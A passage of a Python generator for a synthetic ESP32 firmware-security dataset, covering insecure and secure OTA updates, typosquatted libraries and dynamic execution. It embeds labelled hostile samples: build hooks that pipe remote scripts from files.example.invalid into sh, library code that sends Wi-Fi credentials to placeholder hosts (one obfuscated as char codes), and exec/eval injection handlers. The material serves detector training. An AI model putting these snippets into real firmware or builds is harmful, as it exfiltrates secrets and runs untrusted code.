"""Scenario templates for the synthetic ESP32 firmware-security dataset.

Each scenario function returns a dict:
  files:     {relative_path: text}
  deps:      list of dependency-metadata dicts (written to dependency_manifest.json)
  language:  "cpp" | "python" | "mixed"
  rationale: why the label is what it is
  edge:      True when the sample is a deliberate hard / boundary case

All hosts use reserved names (.example.com / .example.invalid / .test) and all
"bad" behaviour is non-functional stub code meant only for static analysis.
"""
import base64
import binascii
import random
import zlib
from string import Template


def T(s, **kw):
    return Template(s).safe_substitute(**kw)


# --------------------------------------------------------------------------
# shared helpers
# --------------------------------------------------------------------------
TRUSTED = {
    "DHT sensor library": ("Adafruit", True, 2400000),
    "PubSubClient": ("knolleary", True, 3100000),
    "ArduinoJson": ("bblanchon", True, 6000000),
    "Adafruit SSD1306": ("Adafruit", True, 1900000),
    "Adafruit GFX Library": ("Adafruit", True, 2800000),
    "NewPing": ("Tim Eckel", True, 650000),
    "ESP Async WebServer": ("me-no-dev", True, 1200000),
    "WiFiManager": ("tzapu", True, 900000),
}


def dep(name, publisher=None, verified=False, downloads=None, repo=True,
        license_="MIT", version="1.0.0", author=True, vendored=False):
    return dict(name=name, publisher=publisher, publisher_verified=verified,
                downloads=downloads, has_repo=repo, license=license_ if license_ else None,
                version=version, has_author=author, vendored=vendored)


def trusted_dep(name):
    pub, ver, dl = TRUSTED[name]
    return dep(name, pub, ver, dl, True, "MIT", "1.4.2", True, False)


def names(rng):
    k = rng.choice([("WIFI_SSID", "WIFI_PASS"), ("ssid", "password"), ("kSsid", "kPass"), ("NET_SSID", "NET_PW")])
    return dict(
        ssid=k[0], pw=k[1],
        dev="esp32-node-%02d" % rng.randint(1, 60),
        baud=rng.choice([115200, 115200, 115200, 921600]),
        iv=rng.choice([1000, 2000, 5000, 10000]),
        host=rng.choice(["ota.example.com", "updates.example.com", "fw.example.com", "firmware.example.com"]),
        ver=rng.randint(3, 40),
    )


WIFI_DECL = 'const char* $ssid = "YOUR_SSID";\nconst char* $pw = "YOUR_PASSWORD";\n'
WIFI_CONN = r"""WiFi.mode(WIFI_STA);
  WiFi.begin($ssid, $pw);
  while (WiFi.status() != WL_CONNECTED) { delay(500); Serial.print("."); }
  Serial.println(WiFi.localIP());
"""


def ind(s, n=2):
    pad = " " * n
    return "\n".join((pad + l if l.strip() else l) for l in s.strip("\n").split("\n")) + "\n"


def app_stub(rng, N):
    """Small unrelated application code so samples are not identical."""
    opts = [
        ("", 'static unsigned long last = 0;\n  if (millis() - last > $iv) { last = millis(); digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN)); }'),
        ("float readBattery() { return analogRead(34) * (3.3f / 4095.0f) * 2.0f; }\n",
         'static unsigned long last = 0;\n  if (millis() - last > $iv) { last = millis(); Serial.printf("vbat=%.2f\\n", readBattery()); }'),
        ("", 'static unsigned long last = 0;\n  if (millis() - last > $iv) { last = millis(); Serial.println("heartbeat"); }'),
    ]
    f, l = rng.choice(opts)
    return T(f, **N), T(l, **N)


def sketch(inc, glob, setup, loop, funcs="", N=None):
    N = N or {}
    s = "\n".join(inc) + "\n\n" + glob + "\n" + funcs + "\nvoid setup() {\n  Serial.begin($baud);\n" + setup + "}\n\nvoid loop() {\n" + loop + "}\n"
    return T(s, **N)


def pio(libs, board="esp32dev", extra=""):
    s = "[env:%s]\nplatform = espressif32\nboard = %s\nframework = arduino\nmonitor_speed = 115200\n" % (board, board)
    if libs:
        s += "lib_deps =\n" + "\n".join("    " + l for l in libs) + "\n"
    return s + extra


def cpp_proj(main, libs=(), extra_files=None, extra_pio=""):
    f = {"src/main.cpp": main, "platformio.ini": pio(list(libs), extra=extra_pio)}
    f.update(extra_files or {})
    return f


def deps_for(libs):
    return [trusted_dep(l) for l in libs if l in TRUSTED]


def res(files, deps, language, rationale, edge=False):
    return dict(files=files, deps=deps, language=language, rationale=rationale, edge=edge)


# --------------------------------------------------------------------------
# OTA building blocks
# --------------------------------------------------------------------------
SIG_FUNCS = r"""
static const char PUBKEY_PEM[] =
  "-----BEGIN PUBLIC KEY-----\n"
  "<PLACEHOLDER_BASE64_PUBLIC_KEY>\n"
  "-----END PUBLIC KEY-----\n";

bool verifySignature(const uint8_t* digest, const uint8_t* sig, size_t sigLen) {
  mbedtls_pk_context pk;
  mbedtls_pk_init(&pk);
  int rc = mbedtls_pk_parse_public_key(&pk, (const unsigned char*)PUBKEY_PEM, sizeof(PUBKEY_PEM));
  if (rc == 0) rc = mbedtls_pk_verify(&pk, MBEDTLS_MD_SHA256, digest, 32, sig, sigLen);
  mbedtls_pk_free(&pk);
  return rc == 0;
}
"""

HASH_CMP = r"""
bool hashMatches(const uint8_t* digest, const String& expectedHex) {
  char hex[65];
  for (int i = 0; i < 32; i++) sprintf(hex + i * 2, "%02x", digest[i]);
  hex[64] = 0;
  return expectedHex.equalsIgnoreCase(String(hex));
}
"""


def ota_sketch(rng, N, *, https=True, auth=False, sha=False, sig=False,
               manifest=False, version_check=False, style=0):
    scheme = "https" if https else "http"
    inc = ["#include <WiFi.h>", "#include <HTTPClient.h>", "#include <Update.h>"]
    if https:
        inc.append("#include <WiFiClientSecure.h>")
    if sha or sig:
        inc.append('#include "mbedtls/sha256.h"')
    if sig:
        inc.append('#include "mbedtls/pk.h"')
    if manifest:
        inc.append("#include <ArduinoJson.h>")
    if style == 1:
        inc.append("#include <LittleFS.h>")

    g = WIFI_DECL
    g += 'const char* FW_URL = "%s://$host/fw/$dev/firmware.bin";\n' % scheme
    if sig:
        g += 'const char* SIG_URL = "%s://$host/fw/$dev/firmware.sig";\n' % scheme
    if manifest:
        g += 'const char* MANIFEST_URL = "%s://$host/fw/$dev/manifest.json";\n' % scheme
    if https:
        g += 'const char* ROOT_CA = "-----BEGIN CERTIFICATE-----\\n<PLACEHOLDER_ROOT_CA>\\n-----END CERTIFICATE-----\\n";\n'
    if auth:
        g += 'const char* OTA_TOKEN = "REPLACE_WITH_DEVICE_TOKEN";\n'
    if sha and not manifest:
        g += 'const char* EXPECTED_SHA256 = "0000000000000000000000000000000000000000000000000000000000000000";\n'
    if version_check:
        g += "const int CURRENT_VERSION = $ver;\n"
    g = T(g, **N)

    funcs = ""
    if sha:
        funcs += HASH_CMP
    if sig:
        funcs += SIG_FUNCS

    # begin helper: open an HTTP(S) request
    begin_http = (
        "  HTTPClient http;\n"
        + ("  WiFiClientSecure client;\n  client.setCACert(ROOT_CA);\n  http.begin(client, URL);\n" if https else
           "  WiFiClient client;\n  http.begin(client, URL);\n")
        + ('  http.addHeader("Authorization", String("Bearer ") + OTA_TOKEN);\n' if auth else "")
    )
    funcs += "\nbool httpGetString(const char* URL, String& out) {\n" + begin_http + \
        "  int code = http.GET();\n  if (code != 200) { http.end(); return false; }\n  out = http.getString();\n  http.end();\n  return true;\n}\n"

    if sig:
        funcs += r"""
size_t fetchBinary(const char* URL, uint8_t* buf, size_t cap) {
""" + begin_http + r"""  int code = http.GET();
  if (code != 200) { http.end(); return 0; }
  size_t n = http.getStreamPtr()->readBytes(buf, cap);
  http.end();
  return n;
}
"""

    body = "bool performUpdate() {\n"
    if manifest:
        body += '  String m;\n  if (!httpGetString(MANIFEST_URL, m)) return false;\n  JsonDocument doc;\n  if (deserializeJson(doc, m)) return false;\n'
        body += '  String expectedSha = doc["sha256"] | "";\n'
        if version_check:
            body += '  int newVer = doc["version"] | 0;\n  if (newVer <= CURRENT_VERSION) return false;  // no downgrade\n'
    elif sha:
        body += "  String expectedSha = EXPECTED_SHA256;\n"
    if sig:
        body += "  uint8_t sig[256];\n  size_t sigLen = fetchBinary(SIG_URL, sig, sizeof(sig));\n  if (sigLen == 0) return false;\n"

    if style == 0:
        body += "  const char* URL = FW_URL;\n" + begin_http
        body += "  int code = http.GET();\n  if (code != 200) { http.end(); return false; }\n  int len = http.getSize();\n"
        body += "  if (!Update.begin(len > 0 ? len : UPDATE_SIZE_UNKNOWN)) { http.end(); return false; }\n"
        if sha or sig:
            body += "  mbedtls_sha256_context ctx;\n  mbedtls_sha256_init(&ctx);\n  mbedtls_sha256_starts(&ctx, 0);\n"
        body += "  WiFiClient* s = http.getStreamPtr();\n  uint8_t buf[1024];\n  int remaining = len;\n"
        body += "  while (http.connected() && remaining > 0) {\n    size_t n = s->readBytes(buf, min(remaining, 1024));\n    if (n == 0) break;\n    Update.write(buf, n);\n"
        if sha or sig:
            body += "    mbedtls_sha256_update(&ctx, buf, n);\n"
        body += "    remaining -= n;\n  }\n  http.end();\n"
        if sha or sig:
            body += "  uint8_t digest[32];\n  mbedtls_sha256_finish(&ctx, digest);\n  mbedtls_sha256_free(&ctx);\n"
        if sha:
            body += "  if (!hashMatches(digest, expectedSha)) { Update.abort(); return false; }\n"
        if sig:
            body += "  if (!verifySignature(digest, sig, sigLen)) { Update.abort(); return false; }\n"
        body += "  return Update.end(true);\n}\n"
    else:
        # style 1: download to LittleFS, check, then flash from file
        body += "  const char* URL = FW_URL;\n" + begin_http
        body += '  int code = http.GET();\n  if (code != 200) { http.end(); return false; }\n  File f = LittleFS.open("/fw.bin", "w");\n  if (!f) { http.end(); return false; }\n  http.writeToStream(&f);\n  f.close();\n  http.end();\n'
        if sha or sig:
            body += '  mbedtls_sha256_context ctx;\n  mbedtls_sha256_init(&ctx);\n  mbedtls_sha256_starts(&ctx, 0);\n  File r = LittleFS.open("/fw.bin", "r");\n  uint8_t buf[512];\n  while (r.available()) { size_t n = r.read(buf, sizeof(buf)); mbedtls_sha256_update(&ctx, buf, n); }\n  r.close();\n  uint8_t digest[32];\n  mbedtls_sha256_finish(&ctx, digest);\n  mbedtls_sha256_free(&ctx);\n'
        if sha:
            body += '  if (!hashMatches(digest, expectedSha)) { LittleFS.remove("/fw.bin"); return false; }\n'
        if sig:
            body += '  if (!verifySignature(digest, sig, sigLen)) { LittleFS.remove("/fw.bin"); return false; }\n'
        body += '  File fw = LittleFS.open("/fw.bin", "r");\n  if (!Update.begin(fw.size())) return false;\n  Update.writeStream(fw);\n  fw.close();\n  return Update.end(true);\n}\n'
    funcs += "\n" + body

    setup = ind(WIFI_CONN)
    if style == 1:
        setup += "  LittleFS.begin(true);\n"
    setup += "  if (performUpdate()) { Serial.println(\"Update OK\"); ESP.restart(); }\n  else Serial.println(\"Update rejected\");\n"
    f_app, l_app = app_stub(rng, N)
    return sketch(inc, g, setup, "  " + l_app + "\n", funcs + "\n" + f_app, N)


# --------------------------------------------------------------------------
# O: OTA / firmware update
# --------------------------------------------------------------------------
def O01(rng, v):
    N = names(rng)
    st = v % 4
    if st == 0:
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>", "#include <Update.h>"],
                   WIFI_DECL + "WebServer server(80);\n", ind(WIFI_CONN) + r"""  server.on("/update", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/plain", Update.hasError() ? "FAIL" : "OK");
    delay(500);
    ESP.restart();
  }, handleUpload);
  server.begin();
""", "  server.handleClient();\n", r"""
void handleUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    if (!Update.begin(UPDATE_SIZE_UNKNOWN)) Update.printError(Serial);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) Update.printError(Serial);
  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) Serial.println("Update OK");
  }
}
""", N)
    elif st == 1:
        s = sketch(["#include <WiFi.h>", "#include <ESPAsyncWebServer.h>", "#include <Update.h>"],
                   WIFI_DECL + "AsyncWebServer server(80);\n", ind(WIFI_CONN) + r"""  server.on("/ota", HTTP_POST,
    [](AsyncWebServerRequest* request) {
      request->send(200, "text/plain", Update.hasError() ? "FAIL" : "OK");
      ESP.restart();
    },
    [](AsyncWebServerRequest* request, String filename, size_t index, uint8_t* data, size_t len, bool final) {
      if (index == 0) Update.begin(UPDATE_SIZE_UNKNOWN);
      Update.write(data, len);
      if (final) Update.end(true);
    });
  server.begin();
""", "  delay(10);\n", "", N)
    elif st == 2:
        s = sketch(["#include <WiFi.h>", "#include <ArduinoOTA.h>"], WIFI_DECL,
                   ind(WIFI_CONN) + '  ArduinoOTA.setHostname("$dev");\n  // no password configured\n  ArduinoOTA.begin();\n',
                   "  ArduinoOTA.handle();\n", "", N)
    else:
        s = sketch(["#include <WiFi.h>", "#include <esp_ota_ops.h>"], WIFI_DECL + "WiFiServer otaServer(8266);\n",
                   ind(WIFI_CONN) + "  otaServer.begin();\n", r"""  WiFiClient c = otaServer.available();
  if (!c) return;
  const esp_partition_t* part = esp_ota_get_next_update_partition(NULL);
  esp_ota_handle_t h;
  esp_ota_begin(part, OTA_SIZE_UNKNOWN, &h);
  uint8_t buf[1024];
  while (c.connected() || c.available()) {
    int n = c.read(buf, sizeof(buf));
    if (n > 0) esp_ota_write(h, buf, n);
  }
  esp_ota_end(h);
  esp_ota_set_boot_partition(part);
  ESP.restart();
""", "", N)
    return res(cpp_proj(s, ["ESP Async WebServer"] if st == 1 else []), deps_for(["ESP Async WebServer"] if st == 1 else []),
               "cpp", "OTA endpoint accepts firmware with no authentication and no integrity check")


def O02(rng, v):
    N = names(rng)
    s = ota_sketch(rng, N, https=True, auth=False, sha=(v >= 2), sig=True, style=v % 2)
    return res(cpp_proj(s, ["ArduinoJson"] if False else []), [], "cpp",
               "Firmware is hashed and its signature verified against an embedded public key before Update.end()")


def O03(rng, v):
    N = names(rng)
    if v == 3:
        inc = ["#include <WiFi.h>", "#include <WiFiClientSecure.h>", "#include <HTTPUpdate.h>"]
        g = WIFI_DECL + 'const char* FW_URL = "https://$host/fw/$dev/firmware.bin";\nconst char* ROOT_CA = "-----BEGIN CERTIFICATE-----\\n<PLACEHOLDER_ROOT_CA>\\n-----END CERTIFICATE-----\\n";\n'
        setup = ind(WIFI_CONN) + r"""  WiFiClientSecure client;
  client.setCACert(ROOT_CA);
  t_httpUpdate_return ret = httpUpdate.update(client, FW_URL);
  if (ret == HTTP_UPDATE_OK) Serial.println("updated");
"""
        s = sketch(inc, g, setup, "  delay(1000);\n", "", N)
    else:
        s = ota_sketch(rng, N, https=True, auth=(v != 2), sha=False, sig=False, style=v % 2)
    return res(cpp_proj(s), [], "cpp",
               "OTA over HTTPS but nothing verifies the firmware image itself (no hash or signature)")


def O04(rng, v):
    N = names(rng)
    s = ota_sketch(rng, N, https=True, auth=True, sha=True, manifest=True,
                   version_check=(v >= 2), style=v % 2)
    return res(cpp_proj(s, ["ArduinoJson"]), deps_for(["ArduinoJson"]), "cpp",
               "HTTPS + bearer token + SHA-256 from authenticated manifest checked before Update.end()"
               + (" + downgrade protection" if v >= 2 else ""))


def O05(rng, v):
    N = names(rng)
    if v == 0:
        inc = ["#include <WiFi.h>", "#include <HTTPUpdate.h>"]
        g = WIFI_DECL + 'const char* FW_URL = "http://$host/fw/$dev/firmware.bin";\n'
        setup = ind(WIFI_CONN) + "  WiFiClient client;\n  t_httpUpdate_return ret = httpUpdate.update(client, FW_URL);\n  if (ret == HTTP_UPDATE_OK) Serial.println(\"updated\");\n"
        s = sketch(inc, g, setup, "  delay(1000);\n", "", N)
        edge = False
    elif v == 1:
        s = ota_sketch(rng, N, https=False, auth=True, style=0)
        edge = False
    elif v == 2:
        s = ota_sketch(rng, N, https=False, auth=False, style=1)
        edge = False
    else:
        s = ota_sketch(rng, N, https=False, auth=True, sha=True, manifest=True, style=0)
        edge = True
    return res(cpp_proj(s, ["ArduinoJson"] if v == 3 else []), deps_for(["ArduinoJson"] if v == 3 else []), "cpp",
               "Firmware fetched over plain HTTP: attacker on path can replace the image"
               + (" (hash comes from the same HTTP channel, so still untrusted)" if v == 3 else ""), edge)


# --------------------------------------------------------------------------
# D: dependency / package security
# --------------------------------------------------------------------------
DHT_MAIN = r"""#include <WiFi.h>
#include "$hdr"

$cls sensor($pin);

void setup() {
  Serial.begin(115200);
  sensor.begin();
}

void loop() {
  Serial.printf("temp=%.1f\n", sensor.readTemperature());
  delay(2000);
}
"""


def lib_cpp(cls, hdr_guard, body_extra="", inc_extra=""):
    h = "#pragma once\n#include <Arduino.h>\n%s\nclass %s {\n public:\n  explicit %s(uint8_t pin) : _pin(pin) {}\n  void begin();\n  float readTemperature();\n private:\n  uint8_t _pin;\n};\n" % (inc_extra, cls, cls)
    c = '#include "%s.h"\n\nvoid %s::begin() {\n  pinMode(_pin, INPUT);\n%s}\n\nfloat %s::readTemperature() {\n  int raw = analogRead(_pin);\n  return raw * (3.3f / 4095.0f) * 100.0f;\n}\n' % (hdr_guard, cls, body_extra, cls)
    return h, c


def vendored_lib(name, cls, meta_json, body_extra="", inc_extra="", extra=None):
    h, c = lib_cpp(cls, name, body_extra, inc_extra)
    f = {"lib/%s/src/%s.h" % (name, name): h, "lib/%s/src/%s.cpp" % (name, name): c,
         "lib/%s/library.json" % name: meta_json}
    f.update(extra or {})
    return f


def libjson(name, **kw):
    import json
    d = {"name": name, "version": kw.get("version", "1.0.0")}
    if kw.get("desc", True):
        d["description"] = "Simple analog temperature helper"
    if kw.get("author", True):
        d["authors"] = [{"name": kw.get("author_name", "Example Dev")}]
    if kw.get("repo", True):
        d["repository"] = {"type": "git", "url": "https://github.com/example-dev/%s" % name}
    if kw.get("license", True):
        d["license"] = "MIT"
    d["frameworks"] = "arduino"
    d["platforms"] = "espressif32"
    if kw.get("extra_script"):
        d["build"] = {"extraScript": kw["extra_script"]}
    return json.dumps(d, indent=2) + "\n"


def D01(rng, v):
    base = ["ArduinoJson", "PubSubClient", "Adafruit SSD1306", "DHT sensor library"][v]
    fake = {"ArduinoJson": "ArduinoJsonn", "PubSubClient": "PubSubCIient",
            "Adafruit SSD1306": "Adafruit-SSD1306", "DHT sensor library": "DHT_sensor_Iibrary"}[base]
    cls = "TempHelper"
    files = vendored_lib("lib_" + fake.replace("-", "_").lower()[:12], cls,
                         libjson(fake, author=False, repo=(v % 2 == 0)))
    libname = "lib_" + fake.replace("-", "_").lower()[:12]
    main = T(DHT_MAIN, hdr=libname + ".h", cls=cls, pin=rng.choice([32, 33, 34, 35]))
    f = cpp_proj(main, [fake], files)
    d = [dep(fake, publisher=rng.choice(["unknown-dev", None, "x9dev"]), verified=False,
             downloads=rng.randint(20, 400), repo=(v % 2 == 0), license_="MIT", author=False)]
    return res(f, d, "cpp",
               "Package name is one edit away from a trusted library; code itself is benign, so this is a suspicion signal not proof")


EXTRA_SCRIPTS = [
    # os.system fetch+run
    ('Import("env")\nimport os\n\nos.system("wget -q http://files.example.invalid/prep.sh -O /tmp/prep.sh && sh /tmp/prep.sh")\n', "extra_script.py"),
    # pre-action with subprocess
    ('Import("env")\nimport subprocess\n\ndef _prep(source, target, env):\n    subprocess.call("curl -s http://files.example.invalid/hook | sh", shell=True)\n\nenv.AddPreAction("buildprog", _prep)\n', "extra_script.py"),
    # download then exec
    ('Import("env")\nimport urllib.request\n\ncode = urllib.request.urlopen("http://files.example.invalid/build_patch.py").read()\nexec(code)\n', "scripts/patch.py"),
    # build flags from network
    ('Import("env")\nfrom urllib.request import urlopen\n\nflags = urlopen("http://files.example.invalid/flags.txt").read().decode().split()\nenv.Append(BUILD_FLAGS=flags)\n', "scripts/flags.py"),
]


def D02(rng, v):
    name = rng.choice(["sensor_calib", "adc_helper", "temp_utils", "pin_tools"]) + str(v)
    script, path = EXTRA_SCRIPTS[v]
    files = vendored_lib(name, "TempHelper", libjson(name, extra_script=path),
                         extra={"lib/%s/%s" % (name, path): script})
    main = T(DHT_MAIN, hdr=name + ".h", cls="TempHelper", pin=rng.choice([32, 33, 34]))
    f = cpp_proj(main, [name], files)
    return res(f, [dep(name, "example-dev", False, rng.randint(300, 4000), True, "MIT", "1.0.0", True, True)], "mixed",
               "Library build hook (extraScript) downloads and/or runs remote content at build time; suspicious but not proven malicious")


def D03(rng, v):
    N = names(rng)
    lib = ["DHT sensor library", "PubSubClient", "Adafruit SSD1306", "ArduinoJson"][v]
    if lib == "DHT sensor library":
        main = "#include <DHT.h>\nDHT dht(%d, DHT11);\nvoid setup(){ Serial.begin(115200); dht.begin(); }\nvoid loop(){ Serial.println(dht.readTemperature()); delay(2000); }\n" % rng.choice([4, 5, 15])
    elif lib == "PubSubClient":
        main = T('#include <WiFi.h>\n#include <PubSubClient.h>\nWiFiClient net;\nPubSubClient mqtt(net);\nvoid setup(){ Serial.begin(115200); mqtt.setServer("broker.example.com", 1883); }\nvoid loop(){ if (!mqtt.connected()) mqtt.connect("$dev"); mqtt.loop(); delay(100); }\n', **N)
    elif lib == "Adafruit SSD1306":
        main = "#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\nAdafruit_SSD1306 oled(128, 64, &Wire, -1);\nvoid setup(){ oled.begin(SSD1306_SWITCHCAPVCC, 0x3C); oled.clearDisplay(); oled.println(\"ok\"); oled.display(); }\nvoid loop(){}\n"
    else:
        main = '#include <ArduinoJson.h>\nvoid setup(){ Serial.begin(115200); JsonDocument d; d["t"]=21.5; serializeJson(d, Serial); }\nvoid loop(){}\n'
    libs = [lib] + (["Adafruit GFX Library"] if lib == "Adafruit SSD1306" else [])
    return res(cpp_proj(main, libs), deps_for(libs), "cpp",
               "Well-known library from its verified publisher with large install base")


def D04(rng, v):
    name = ["esp_tempkit", "uni_sensorlib", "quickadc", "nodehelper"][v]
    files = vendored_lib(name, "TempHelper", libjson(name, author=(v == 3), repo=False, license=False, desc=False))
    main = T(DHT_MAIN, hdr=name + ".h", cls="TempHelper", pin=rng.choice([32, 33, 34]))
    f = cpp_proj(main, [name], files)
    return res(f, [dep(name, None, False, None, False, None, "0.0.1", (v == 3), True)], "cpp",
               "Unknown publisher, no repo/license/downloads info; source itself is clean so only metadata is suspicious")


BEACON_CPP = [
    # 0: POST wifi creds
    ('  HTTPClient h;\n  h.begin("http://collector.example.invalid/api/cfg");\n  h.addHeader("Content-Type", "application/x-www-form-urlencoded");\n  h.POST(String("s=") + WiFi.SSID() + "&p=" + WiFi.psk());\n  h.end();\n',
     "#include <WiFi.h>\n#include <HTTPClient.h>"),
    # 1: raw socket to hardcoded IP with creds in query
    ('  WiFiClient c;\n  if (c.connect("203.0.113.77", 8080)) {\n    c.print(String("GET /c?ssid=") + WiFi.SSID() + "&pw=" + WiFi.psk() + " HTTP/1.0\\r\\n\\r\\n");\n    c.stop();\n  }\n',
     "#include <WiFi.h>"),
    # 2: NVS creds over UDP
    ('  Preferences p;\n  p.begin("wifi", true);\n  String blob = p.getString("ssid") + ":" + p.getString("pass");\n  p.end();\n  WiFiUDP u;\n  u.beginPacket(IPAddress(203, 0, 113, 77), 9999);\n  u.print(blob);\n  u.endPacket();\n',
     "#include <WiFi.h>\n#include <WiFiUdp.h>\n#include <Preferences.h>"),
    # 3: obfuscated host built from char codes, forwards UART data
    ('  char host[24] = {99,111,108,108,101,99,116,111,114,46,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100};\n  WiFiClient c;\n  if (c.connect(host, 80)) {\n    while (Serial.available()) c.write(Serial.read());\n    c.stop();\n  }\n',
     "#include <WiFi.h>"),
]


def D05(rng, v):
    name = ["calib_sync", "sensor_cal", "tempcal", "adc_boost"][v]
    body, inc = BEACON_CPP[v]
    files = vendored_lib(name, "TempHelper", libjson(name), body_extra=body, inc_extra=inc)
    main = T(DHT_MAIN, hdr=name + ".h", cls="TempHelper", pin=rng.choice([32, 33, 34]))
    f = cpp_proj(main, [name], files)
    return res(f, [dep(name, "example-dev", False, rng.randint(100, 2500), True, "MIT", "1.2.0", True, True)], "cpp",
               "Library begin() silently sends Wi-Fi credentials/UART data to a hardcoded external endpoint, unrelated to its stated purpose")


def D06(rng, v):
    name = ["adc_smoother", "pidlite", "ringbuf_esp", "ArduinoJson-Lite"][v]
    files = vendored_lib(name.replace("-", "_"), "TempHelper",
                         libjson(name, version="2.%d.1" % v))
    nm = name.replace("-", "_")
    main = T(DHT_MAIN, hdr=nm + ".h", cls="TempHelper", pin=rng.choice([32, 33, 34]))
    f = cpp_proj(main, [name], files)
    edge = (v == 3)
    return res(f, [dep(name, "example-dev", False, rng.randint(40, 300), True, "MIT", "2.%d.1" % v, True, True)], "cpp",
               "Small but fully documented library (repo, license, author, clean source)"
               + ("; name resembles a trusted lib but all other signals are healthy" if edge else ""), edge)


# --------------------------------------------------------------------------
# E: dynamic execution (MicroPython + gateway Python)
# --------------------------------------------------------------------------
def E01(rng, v):
    t = rng.choice(["home", "farm", "lab"])
    if v == 0:
        code = f'''import network, machine
from umqtt.simple import MQTTClient

def on_msg(topic, msg):
    exec(msg.decode())          # run whatever the broker sends

c = MQTTClient("{t}-node", "broker.example.com")
c.set_callback(on_msg)
c.connect()
c.subscribe(b"{t}/cmd")
while True:
    c.wait_msg()
'''
    elif v == 1:
        code = f'''import os
import paho.mqtt.client as mqtt

def on_message(client, userdata, msg):
    host = msg.payload.decode()
    os.system("ping -c 1 " + host)

cl = mqtt.Client()
cl.on_message = on_message
cl.connect("broker.example.com", 1883)
cl.subscribe("{t}/diag")
cl.loop_forever()
'''
    elif v == 2:
        code = f'''import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/lookup")
def lookup():
    host = request.args["host"]
    out = subprocess.run("nslookup " + host, shell=True, capture_output=True, text=True)
    return out.stdout

app.run(host="0.0.0.0", port=8080)
'''
    else:
        code = f'''import socket

s = socket.socket()
s.bind(("0.0.0.0", 7000))
s.listen(1)
while True:
    conn, addr = s.accept()
    data = conn.recv(256)
    result = eval(data)          # evaluate remote expression
    conn.send(str(result).encode())
    conn.close()
'''
    fn = "main.py" if v in (0, 3) else "gateway.py"
    return res({fn: code}, [], "python",
               "Untrusted network input is passed straight to a shell / exec / eval")


def E02(rng, v):
    cmds = [
        ('subprocess.run(["systemctl", "restart", "esp-gateway"], check=True)', "import subprocess"),
        ('os.system("sync")', "import os"),
        ('subprocess.run(["df", "-h", "/"], capture_output=True, text=True)', "import subprocess"),
        ('os.system("date -u > /var/log/esp_gw_last_sync")', "import os"),
    ]
    c, imp = cmds[v]
    code = f'''{imp}
import serial, time

ser = serial.Serial("/dev/ttyUSB0", 115200, timeout=1)
last = time.time()

while True:
    line = ser.readline().decode(errors="ignore").strip()
    if line.startswith("temp="):
        print(float(line[5:]))
    if time.time() - last > {rng.choice([300, 600, 3600])}:
        last = time.time()
        {c}      # fixed command, no external input
'''
    return res({"gateway.py": code}, [], "python",
               "Executes an OS command but the command string is constant (no attacker-controlled data); still a sensitive capability worth review")


def E03(rng, v):
    if v == 0:
        code = '''from machine import ADC, Pin
adc = ADC(Pin(34))

while True:
    t = adc.read() * 0.08
    f = eval("%f * 1.8 + 32" % t)     # eval for a trivial conversion
    print(f)
'''
    elif v == 1:
        code = '''from machine import ADC, Pin

def read_temp(): return ADC(Pin(34)).read() * 0.08
def read_hum():  return ADC(Pin(35)).read() * 0.02

for name in ("temp", "hum"):
    print(name, globals()["read_" + name]())    # dynamic lookup of fixed names
'''
    elif v == 2:
        code = f'''LIMIT = {rng.choice([30, 35, 40])}
exec("threshold = %d" % LIMIT)       # exec used to set a variable
from machine import ADC, Pin
a = ADC(Pin(34))
while True:
    if a.read() > threshold * 10:
        print("high")
'''
    else:
        code = '''CONFIG_EXPR = "[34, 35, 32][1]"
from machine import ADC, Pin
pin_no = eval(CONFIG_EXPR)           # constant expression evaluated at runtime
print(ADC(Pin(pin_no)).read())
'''
    return res({"main.py": code}, [], "python",
               "Dynamic code execution (eval/exec/globals lookup) with no external input; unnecessary and fragile but not directly exploitable")


def E04(rng, v):
    stmts = ['print("sensor ready")', 'led_state = 1', 'print("boot ok")', 'calibrated = True']
    payload = rng.choice(stmts)
    if v == 0:
        b = base64.b64encode(payload.encode()).decode()
        code = f'import base64\nexec(base64.b64decode("{b}").decode())\n'
    elif v == 1:
        h = binascii.hexlify(payload.encode()).decode()
        code = f'import binascii\nexec(binascii.unhexlify("{h}").decode())\n'
    elif v == 2:
        z = base64.b64encode(zlib.compress(payload.encode())).decode()
        code = f'import base64, zlib\nexec(zlib.decompress(base64.b64decode("{z}")))\n'
    else:
        b = base64.b64encode(payload.encode()).decode()
        code = f'import ubinascii\nexec(ubinascii.a2b_base64("{b}").decode())\n'
    return res({"main.py": code}, [], "python",
               "Encoded constant fed to exec(): classic obfuscation pattern, but payload here is a hardcoded constant so ambiguous without decoding")


def E05(rng, v):
    if v == 0:
        code = r"""#include <Arduino.h>
const int N = 8;
int buf[N];
int idx = 0;

float movingAverage(int sample) {
  buf[idx] = sample;
  idx = (idx + 1) % N;
  long sum = 0;
  for (int i = 0; i < N; i++) sum += buf[i];
  return sum / (float)N;
}

void setup() { Serial.begin(115200); }
void loop() {
  Serial.println(movingAverage(analogRead(34)));
  delay(100);
}
"""
        fn, lang = "src/main.cpp", "cpp"
    elif v == 1:
        code = """from machine import ADC, Pin
import time

adc = ADC(Pin(34))
OFFSET, GAIN = -0.4, 0.081

def calibrated(raw):
    return raw * GAIN + OFFSET

prev = None
while True:
    t = calibrated(adc.read())
    if prev is None or abs(t - prev) < 10:     # reject spikes
        prev = t
        print(t)
    time.sleep(1)
"""
        fn, lang = "main.py", "python"
    elif v == 2:
        code = r"""#include <Arduino.h>
const int TRIG = 5, ECHO = 18;

float medianOf3(float a, float b, float c) {
  if (a > b) { float t = a; a = b; b = t; }
  if (b > c) { float t = b; b = c; c = t; }
  if (a > b) { float t = a; a = b; b = t; }
  return b;
}

float ping() {
  digitalWrite(TRIG, LOW); delayMicroseconds(2);
  digitalWrite(TRIG, HIGH); delayMicroseconds(10);
  digitalWrite(TRIG, LOW);
  return pulseIn(ECHO, HIGH, 30000) * 0.0343f / 2.0f;
}

void setup() { Serial.begin(115200); pinMode(TRIG, OUTPUT); pinMode(ECHO, INPUT); }
